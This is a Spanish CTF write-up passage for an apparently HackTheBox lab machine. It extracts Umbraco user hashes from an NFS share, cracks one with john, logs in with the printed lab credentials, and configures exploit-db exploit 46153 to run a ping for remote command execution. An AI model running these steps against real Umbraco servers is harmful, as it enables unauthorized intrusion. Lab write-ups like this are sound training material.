## Vulnerability Assessment {-}

### Analyzando el mount {-}

```bash
cd /mnt/nfs
ls
cd App_Browsers
cd ..
cd App_Data
ls
```

Aqui vemos un fichero umbraco.config y un Umbraco.sdf. Miramos lo que contienen

```bash
cat umbraco.config
cat Umbraco.sdf
strings Umbraco.sdf | less -S
```

Aqui vemos usuarios con hashes.

### Crack hash con john {-}

Copiamos el hash en un fichero y lo crackeamos con john

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Ya tenemos una contrase√±a. Nos connectamos en el panel de authenticacion.

```bash
user: admin@htb.local 
pwd : baconandcheese
```

### Abusando de Umbraco {-}

Ahora que hemos ganado acceso al dashboard de Umbraco, tenemos que encontrar la via para ganar acceso al systema. Como ya hemos encontrado 
exploits en la **exploit-db**, vamos a utilizar una de ellas.

```bash
searchsploit umbraco
searchsploit -m 46153.py
mv 46153.py umbraco_exploit.py
vi umbraco_exploit.py
```

Aqui le ponemos los datos necessario

```python
login = "admin@htb.local"
password = "baconandcheese"
host = "http://10.10.10.180"

#en el payload
proc.StartInfo.FileName = "cmd.exe"
cmd = "/c ping 10.10.14.8"
```

Nos ponemos en escucha por trazas icmp

```bash
tcpdump -i tun0 icmp -n
```

y lanzamos el exploit con `python umbraco_exploit.py` y vemos que tenemos capacidad de ejecucion de comandos.


